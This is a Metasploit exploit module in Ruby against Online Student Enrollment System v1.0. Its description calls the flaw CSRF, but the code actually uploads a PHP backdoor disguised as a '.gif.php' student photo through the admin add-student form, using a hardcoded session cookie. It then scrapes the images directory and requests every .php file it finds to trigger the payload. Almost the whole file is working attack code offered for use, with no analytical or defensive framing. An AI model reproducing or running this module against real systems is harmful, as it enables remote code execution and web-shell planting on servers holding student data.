##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
    require 'msf/core'
    require "net/http"
    require "uri"
    require 'nokogiri'
 


    class MetasploitModule < Msf::Exploit
	Rank = ExcellentRanking

	 include Msf::Exploit::FileDropper
	 include Msf::Exploit::Remote::HttpClient
        
        

        def initialize(info = {})
            super(update_info(info,
                'Name'           => 'Online Student Enrollment System v1.0 Shell Upload ',
                'Description'    => %q{
               This module exploits CSRF Vulnerability on Online Student Enrollment System v1.0. 
                },
                'Author'         => [ 'th3d1gger', 'bkpatron' ],
                
                'License'        => 'MSF_LICENSE',
	        'Platform'       => 'php',
	        'Arch' => ARCH_PHP,
	        'Targets'        =>
        	  [
	            [ 'Automatic', {} ],
	          ],
	        'DefaultTarget'  => 0 ))
            register_options(
                [
                    OptString.new('TARGETURI', [ true, 'Student Enrollment System uriPath', '/student_enrollment/'])



                ], self.class)
        end

        def targeturi
    	    datastore['TARGETURI']
  	end




        def online_reg



 
    
    @fname = "#{rand_text_alphanumeric(rand(10)+6)}.gif.php"
	php = "<?php #{payload.encoded} ?>"
    	post_data = Rex::MIME::Message.new
      post_data.add_part(rand_text_alphanumeric(rand(10)+6), nil, nil,'form-data; name="name"')
    post_data.add_part(rand(9999).to_s, nil, nil, 'form-data; name="roll"') #rolling in the deep lol
    post_data.add_part(rand_text_alphanumeric(rand(9)+6).to_s, nil, nil, 'form-data; name="address"')
    post_data.add_part('01'+rand_text_alphanumeric(rand(6)+6).to_s, nil, nil, 'form-data; name="pcontact"')
    post_data.add_part('2nd', nil, nil, 'form-data; name="class"')
    post_data.add_part(php, 'application/octet-stream', nil, "form-data; name=\"photo\"; filename=\"#{@fname}\"")
    post_data.add_part('Add Student', nil, nil, 'form-data; name="addstudent"')
    
    post_datacan = post_data.to_s

    res = send_request_cgi({
      'method'   => 'POST',
      'uri'      => normalize_uri(datastore["TARGETURI"]+'/admin/index.php?page=add-student'),
      'ctype'    => "multipart/form-data; boundary=#{post_data.bound}",
      'cookies'  => 'PHPSESSID=9178c6b337bdcff98de7fa66a8047f3d;',    
      'data'     => post_datacan
    })
    
    if res.body.include?('Inserted!')
    
    	print_status("backdoor uploaded")
	uri = URI.parse('http://'+rhost.to_s+':'+rport.to_s+datastore['TARGETURI'].to_s+'admin/images/')
	http = Net::HTTP.new(uri.host, uri.port)
 
	
	request = Net::HTTP::Get.new(uri.request_uri)
 
	response = http.request(request)
	doc = Nokogiri::HTML(response.body)

   # Get all anchors via xpath to find uploaded file
	nodeset = doc.xpath('//a')   
	hrefler = nodeset.map {|element| element["href"]}.compact
	hrefler.each { |n| 
	if n.include?('.php')
	#blind execution of payload
		res = send_request_cgi({
      		'method' => 'GET',
      		'uri' => normalize_uri(datastore['TARGETURI']+'/admin/images/'+n)
      
    		})
end	
 }

   	sleep(60)

    else
	#print res.body
    	print_status("Upload Failed because of roll duplicate.Try Again!.")
    end		
 
    
  end

       

        def exploit
	 online_reg

    	if online_reg.nil?
      	fail_with(Failure::Unknown, 'Something went wrong!')
    	end
    	end
    	end
